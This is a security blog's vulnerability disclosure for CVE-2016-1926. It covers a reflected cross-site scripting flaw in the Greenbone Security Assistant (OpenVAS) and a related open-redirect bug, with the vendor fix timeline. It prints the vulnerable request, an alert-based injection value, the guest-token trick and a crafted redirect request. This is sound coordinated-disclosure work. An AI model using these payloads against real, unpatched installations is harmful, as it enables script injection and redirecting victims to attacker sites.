
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>CVE-2016-1926 - XSS in the Greenbone Security Assistant - Internetwache - A secure internet is our concern</title>
  <meta name="author" content="Internetwache.org">

  
  <meta name="description" content="Recently Tim has been working with the software framework &#8220;OpenVAS&#8221; (&#8220;Open Vulnerability Assessment System&#8221;). This software &hellip;">
  <meta name="keywords" content="Internetwache, Internetwache.org, Internet, XSS, Cross Site Scripting, SQLi, SQL Injection, Hacks, Hacker, Hackangriff, Hackattacke, Sebastian Neef, Tim Sch., Internetkriminalität">

  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="https://en.internetwache.org/cve-2016-1926-xss-in-the-greenbone-security-assistant-20-01-2016/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="/javascripts/ender.js"></script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <link href="/atom.xml" rel="alternate" title="Internetwache - A secure internet is our concern" type="application/atom+xml">

  <!-- Twitter Cards -->
  <meta name="twitter:card" content="summary">
  <meta name="twitter:site" content="@internetwache">
  <meta name="twitter:creator" content="@internetwache">
  <meta name="twitter:url" content="https://en.internetwache.org/cve-2016-1926-xss-in-the-greenbone-security-assistant-20-01-2016/">
  <meta name="twitter:title" content="CVE-2016-1926 - XSS in the Greenbone Security Assistant - Internetwache - A secure internet is our concern">
  <meta name="twitter:description" content="Recently Tim has been working with the software framework &#8220;OpenVAS&#8221; (&#8220;Open Vulnerability Assessment System&#8221;). This software is open source so we spent some evenings looking &hellip;">

  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href='/stylesheets/fonts/lato.css' rel='stylesheet' type='text/css'>
<link href='/stylesheets/fonts/sans.css' rel='stylesheet' type='text/css'>
<link href='/stylesheets/fonts/serif.css' rel='stylesheet' type='text/css'>
<link rel="stylesheet" href="/stylesheets/style.css" type="text/css" media="screen" />
<link rel="stylesheet" href="/stylesheets/jquery.fancybox.css?v=2.0.6" type="text/css" media="screen" />


<!-- Add jQuery library -->
<script type="text/javascript" src="/javascripts/jquery.min.js"></script>
<!-- Add fancyBox -->
<script type="text/javascript" src="/javascripts/jquery.fancybox.pack.js?v=2.0.6"></script>
<!-- Add fancyBox jQuery -->
<script type="text/javascript">
  jQuery.noConflict();    // prevents conflicts with Ender.js, use jQuery instead of $
  jQuery(document).ready(function() {
      jQuery(".fancybox").fancybox();
  });
</script>
<!-- End fancyBox insert -->


  <script type="text/javascript" src="/javascripts/jquery.socialshareprivacy.js"></script>
  <script type="text/javascript">
    jQuery(document).ready(function($){
      if($('#socialshareprivacy').length > 0){
        $('#socialshareprivacy').socialSharePrivacy(); 
      }
    });
  </script>


  

</head>

<body   >
  <header role="banner"><hgroup>
<a href="/">
  <div id="logo">
	<img src="/images/logo.png" title="Internetwache.org - Für ein sichereres Internet" alt="Logo der Internetwache.org - Für ein sichereres Internet">
  </div>
</a>
  <!--
<h1><a href="/">Internetwache - A secure internet is our concern</a></h1>
  
    <h2>A secure internet is our concern</h2>
  
-->
  <div class="clear"></div>
</hgroup>

</header>
  <nav role="navigation">  
<ul class="subscription" data-subscription="rss">
  <li><a href="https://internetwache.org/" rel="german-blog" title="german blog"><img src="/images/deflag.png" class="logo_icon" /></a></li>
  <li><a href="https://twitter.com/internetwache" rel="subscribe-twitter" title="subscribe via Twitter"><img src="/images/twitter_logo.png" class="logo_icon" /></a></li>
  <li><a href="https://www.facebook.com/Internetwache.org" rel="subscribe-facebook" title="subscribe via Facebook"><img src="/images/facebook_logo.png" class="logo_icon" /></a></li>
  <li><a href="/atom.xml" rel="subscribe-rss" title="via RSS abonnieren"><img src="/images/rss.png" class="logo_icon" /></a></li>
</ul>

<ul class="main-navigation">
  <li><a href="/">Home</a></li>
  <li><a href="/idea">Idea</a></li>
  <li><a href="/team">Team</a></li>
  <li><a href="/faq">FAQ</a></li>
  <li><a href="/projects">Projects</a></li>
  <li><a href="/archive">Archive</a></li>
  <li><a href="/pgp-contact">Contact</a></li>
</ul>


</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      
        <h1 class="entry-title">CVE-2016-1926 - XSS in the Greenbone Security Assistant</h1>
      
    
    
      <p class="meta">
        








  



<time datetime="2016-01-20T13:18:00+01:00" pubdate data-updated="true">Mi, 20. Januar 2016</time>
        
      </p>
    
  </header>


<div class="entry-content"><p>Recently Tim has been working with the software framework &#8220;OpenVAS&#8221; (&#8220;Open Vulnerability Assessment System&#8221;). This software is open source so we spent some evenings looking for bugs in the webfrontend, the Greenbone Security Assistant. After some time Sebastian found two bugs and we were able to submit those - they are fixed now.</p>

<!-- more -->


<p>For everybody who does not know what <a href="http://www.openvas.org/about.html">OpenVAS</a> is:
OpenVAS is a software for vulnerability management. You can run penetrationstests against diffrent it-systems with it and assess the results. It is also used in the Greenbone Security Manager and comes with Kali Linux.</p>

<h2>CVE-2016-1926: XSS</h2>

<p>If you take a look at the statistics page the following AJAX-Request is send to the backend:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>https://[DOMAIN.tld]/omp?cmd=get_aggregate&xml=0&aggregate_type=nvt&group_column=severity&filt_id=1337&token=guest</span></code></pre></td></tr></table></div></figure>


<p> The value <code>aggregate_type</code> was not escaped properly -
so it was easy to trigger a XSS in the script context. You can simply set <code>aggregate_type=nvt"-alert(document.domain)-"</code> to get this reply:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>        DataSource ("get_aggregate",
</span><span class='line'>                    {xml:1,
</span><span class='line'>                     aggregate_type:"nvt"-alert(document.domain)-"",
</span><span class='line'>                     group_column:"severity",
</span><span class='line'>                     data_column:"",
</span><span class='line'>                     filter:"",
</span><span class='line'>                     filt_id:"1337"});
</span><span class='line'>
</span><span class='line'>    title_total ("Nvts"-alert(document.domain)-" by severity",
</span><span class='line'>                 "count")
</span><span class='line'>
</span><span class='line'>Chart (gsa.data_sources ["aggregate-source"],
</span><span class='line'>        gsa.generators ["aggregate-generator"],
</span><span class='line'>        gsa.displays ["aggregate-display"],
</span><span class='line'>        "aggregate-chart",
</span><span class='line'>        "Nvt"-alert(document.domain)-" by severity",
</span><span class='line'>        "/img/charts/severity-bar-chart.png",
</span><span class='line'>        1,
</span><span class='line'>        "",
</span><span class='line'>        "");</span></code></pre></td></tr></table></div></figure>


<p>Sadly you need to know the value of the <code>token</code> parameter. But if the guestmode is enabled <a href="https://secinfo.greenbone.net/login/login.html">like i.e. in the demo</a>, it is possible to use: <code>token=guest</code>.</p>

<h2>Another minor bug</h2>

<p>The following bug was also fixed with this update.
We observed the following strange behaviour:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>GET //internetwache.org/? HTTP/1.1
</span><span class='line'>Host: secinfo.greenbone.net
</span><span class='line'>Connection: close</span></code></pre></td></tr></table></div></figure>


<p>lead to</p>

<p><code>&lt;a href="//internetwache.org/?r=1&amp;amp;=&amp;amp;token=guest"&gt;Login as a guest&lt;/a&gt;</code></p>

<p>All characters of the path in the GET-request reflect to the href-attribute. Unfortunately a browser can not send a <code>GET javascript:alert(1)</code> request (a leading slash is required), so no way to create a XSS. However we can use the relative protocol to set an arbitrary url. Clicking the &#8216;Login as a guest&#8217; link will redirect the victim to the other domain.</p>

<h2>Details:</h2>

<ul>
<li>Product: Greenbone Security Assistant ≥ 6.0.0 and &lt; 6.0.8</li>
<li>Vendor: <a href="http://www.openvas.org/">OpenVAS</a></li>
<li>Risk: Low, CVSS 1.9 (AV:A/AC:M/Au:M/C:P/I:N/A:N)</li>
</ul>


<p>The communication with Greenbone GmbH was always pleasant, transparent and to the point.</p>

<ul>
<li>07.01.2016: XSS discovered and reported to vendor.</li>
<li>08.01.2016, 08:00: Acknowledgement from vendor and info that fix is already in progress.</li>
<li>08.01.2016, 17:30: Fix ready, QA and testing needed</li>
<li>09.01.2016: Update released for Greenbone Security Manager: <a href="http://greenbone.net/technology/gbsa2016-01.html">Advisory GBSA 2016-01</a></li>
<li>13.01.2016: Update released OpenVAS: <a href="http://www.openvas.org/OVSA20160113.html">Advisory OVSA 20160113</a></li>
<li>18.01.2016: CVE-2016-1926 assigned by MITRE</li>
</ul>


<p>The team of internetwache.org</p>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">Internetwache.org</span></span>

      








  



<time datetime="2016-01-20T13:18:00+01:00" pubdate data-updated="true">Mi, 20. Januar 2016</time>
      

<span class="categories">
  
    <a class='category' href='/categories/xss/'>XSS</a>
  
</span>


    </p>
    
      <div id="socialshareprivacy"></div>

    
    <p class="meta">
      
        <a class="basic-alignment left articlenav" href="/insomnia-teaser-2016-smartcat2-writeup-18-01-2016/" title="Previous Post: Insomni'hack Teaser CTF 2016 - Smartcat2 writeup">&laquo; Insomni'hack Teaser CTF 2016 - Smartcat2 writeup</a>
      
      
        <a class="basic-alignment right articlenav" href="/going-to-the-security-analyst-summit-number-thesas2016-27-02-2016/" title="next Post: Going to the Security Analyst Summit #TheSAS2016">Going to the Security Analyst Summit #TheSAS2016 &raquo;</a>
      
    </p>
  </footer>
</article>

</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/scanning-the-alexa-top-1m-for-ds-store-files-12-03-2018/">Scanning the Alexa Top 1M for .DS_Store files</a>
      </li>
    
      <li class="post">
        <a href="/2017-in-retroperspective-slash-outlook-on-2018-08-01-2018/">2017 in retroperspective / outlook on 2018</a>
      </li>
    
      <li class="post">
        <a href="/certificate-transparency-as-a-source-for-subdomains-14-12-2017/">Certificate Transparency as a source for subdomains</a>
      </li>
    
      <li class="post">
        <a href="/looking-back-on-2016-slash-outlook-on-2017-01-01-2017/">Looking back on 2016 / Outlook on 2017</a>
      </li>
    
      <li class="post">
        <a href="/analysis-of-a-cryptomining-malware-or-why-clicking-on-folder-icons-can-be-dangerous-09-09-2016/">Analysis of a cryptomining malware or why clicking on folder icons can be dangerous</a>
      </li>
    
      <li class="post">
        <a href="/how-we-pwned-your-ics-or-why-you-should-not-put-your-hmi-on-the-internet-18-08-2016/">How we pwned your ICS or why you should not put your HMI on the internet</a>
      </li>
    
      <li class="post">
        <a href="/going-to-troopers-2016-04-04-2016/">Going to Troopers 2016</a>
      </li>
    
      <li class="post">
        <a href="/internetwache-ctf-2016-review-01-03-2016/">Internetwache CTF 2016 review</a>
      </li>
    
      <li class="post">
        <a href="/going-to-the-security-analyst-summit-number-thesas2016-27-02-2016/">Going to the Security Analyst Summit #TheSAS2016</a>
      </li>
    
      <li class="post">
        <a href="/cve-2016-1926-xss-in-the-greenbone-security-assistant-20-01-2016/">CVE-2016-1926 - XSS in the Greenbone Security Assistant</a>
      </li>
    
  </ul>
</section>
<section>
  <h1>Categories</h1>
    <ul id="category-list"><li><a href='//en.internetwache.org/categories/bug-bounty'>Bug bounty (9)</a></li><li><a href='//en.internetwache.org/categories/csrf'>Csrf (6)</a></li><li><a href='//en.internetwache.org/categories/events'>Events (10)</a></li><li><a href='//en.internetwache.org/categories/hall-of-fame'>Hall of fame (11)</a></li><li><a href='//en.internetwache.org/categories/information-disclosure'>Information disclosure (6)</a></li><li><a href='//en.internetwache.org/categories/internet'>Internet (12)</a></li><li><a href='//en.internetwache.org/categories/loginbypass'>Loginbypass (1)</a></li><li><a href='//en.internetwache.org/categories/open-redirect'>Open redirect (1)</a></li><li><a href='//en.internetwache.org/categories/path-traversal'>Path traversal (1)</a></li><li><a href='//en.internetwache.org/categories/phishing'>Phishing (3)</a></li><li><a href='//en.internetwache.org/categories/privilege-escalation'>Privilege escalation (1)</a></li><li><a href='//en.internetwache.org/categories/rce'>Rce (1)</a></li><li><a href='//en.internetwache.org/categories/sqli'>Sqli (10)</a></li><li><a href='//en.internetwache.org/categories/xss'>Xss (33)</a></li></ul>
</section>


  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2019 - Internetwache.org
  | <span><a href="https://www.internetwache.org/impressum">Site notice</a> | <a href="https://www.internetwache.org/datenschutz">Privacy</a></span>
</p>

</footer>
  










<!-- Piwik -->
<script type="text/javascript">
  var _paq = _paq || [];
  _paq.push(["setDocumentTitle", document.domain + "/" + document.title]);
  _paq.push(["setCookieDomain", "*.internetwache.org"]);
  _paq.push(["setDomains", ["*.internetwache.org","*.en.internetwache.org"]]);
  _paq.push(['trackPageView']);
  _paq.push(['enableLinkTracking']);
  (function() {
    var u="//piwik.neef.it/";
    _paq.push(['setTrackerUrl', u+'piwik.php']);
    _paq.push(['setSiteId', 4]);
    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
    g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'piwik.js'; s.parentNode.insertBefore(g,s);
  })();
</script>
<noscript><p><img src="//piwik.neef.it/piwik.php?idsite=4" style="border:0;" alt="" /></p></noscript>
<!-- End Piwik Code -->



</body>
</html>
